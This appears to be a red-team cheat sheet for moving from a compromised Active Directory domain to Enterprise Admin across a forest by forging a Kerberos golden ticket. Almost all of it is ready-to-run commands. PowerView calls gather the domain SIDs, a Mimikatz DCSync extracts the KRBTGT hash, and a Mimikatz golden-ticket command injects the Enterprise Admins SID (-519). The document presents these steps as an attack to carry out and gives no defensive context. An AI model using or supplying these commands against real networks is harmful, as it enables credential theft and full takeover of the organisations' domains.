### Get SID of compromised domain using Bloodhound or Powerview
```
Get-DomainSID
```

### Get SID of target domain using Bloodhound or Powerview
```
Get-NetForest
```

### Get KRBTGT NTLM hash
```
Invoke-Mimikatz -Command '"lsadump::dcsync /domain:<compromisedDomain> /user:krbtgt"'
```

### Request golden ticket - can be done offline, since domain controller connection is not necessary (/enind = validity period 60 minutes, /user can be fictitious, -519 is the SID of enteprise admin)
```
Invoke-Mimikatz -Command '"kerberos::golden /user:<attackerAccount> /domain:<compromisedDomain> /sid:<sidCompromisedDomain> /sids:<sidTargetDomain>-519 /krbtgt:<ntlmHashKrbTgt> /endin:60"'
```

